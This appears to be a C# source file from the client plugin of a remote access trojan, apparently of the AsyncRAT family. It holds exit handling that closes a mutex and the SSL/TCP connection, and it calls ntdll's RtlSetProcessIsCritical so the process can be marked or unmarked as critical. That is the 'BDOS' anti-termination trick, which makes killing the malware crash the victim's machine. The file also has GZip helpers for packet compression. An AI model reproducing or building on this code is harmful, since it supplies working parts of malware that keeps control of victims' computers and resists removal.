using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Text;
using System.Threading;

namespace Plugin
{
    public static class Methods
    {
        public static void ClientExit()
        {
            try
            {
                if (Convert.ToBoolean(Plugin.BDOS) && IsAdmin())
                    ProcessCriticalExit();
                CloseMutex();
                Connection.SslClient?.Close();
                Connection.TcpClient?.Close();
            }
            catch { }
        }

        public static bool IsAdmin()
        {
            return new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator);
        }

        public static void CloseMutex()
        {
            if (Plugin.AppMutex != null)
            {
                Plugin.AppMutex.Close();
                Plugin.AppMutex = null;
            }
        }

        public static void SystemEvents_SessionEnding(object sender, SessionEndingEventArgs e)
        {
            if (Convert.ToBoolean(Plugin.BDOS) && Methods.IsAdmin())
                ProcessCriticalExit();
        }

        public static void ProcessCriticalExit()
        {
            try
            {
                RtlSetProcessIsCritical(0, 0, 0);
            }
            catch
            {
                while (true)
                {
                    Thread.Sleep(100000); //prevents a BSOD on exit failure
                }
            }
        }

        public static byte[] Decompress(byte[] input)
        {
            using (var source = new MemoryStream(input))
            {
                byte[] lengthBytes = new byte[4];
                source.Read(lengthBytes, 0, 4);

                var length = BitConverter.ToInt32(lengthBytes, 0);
                using (var decompressionStream = new GZipStream(source,
                    CompressionMode.Decompress))
                {
                    var result = new byte[length];
                    decompressionStream.Read(result, 0, length);
                    return result;
                }
            }
        }

        public static byte[] Compress(byte[] input)
        {
            using (var result = new MemoryStream())
            {
                var lengthBytes = BitConverter.GetBytes(input.Length);
                result.Write(lengthBytes, 0, 4);

                using (var compressionStream = new GZipStream(result,
                    CompressionMode.Compress))
                {
                    compressionStream.Write(input, 0, input.Length);
                    compressionStream.Flush();

                }
                return result.ToArray();
            }
        }

        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern void RtlSetProcessIsCritical(UInt32 v1, UInt32 v2, UInt32 v3);
    }
}
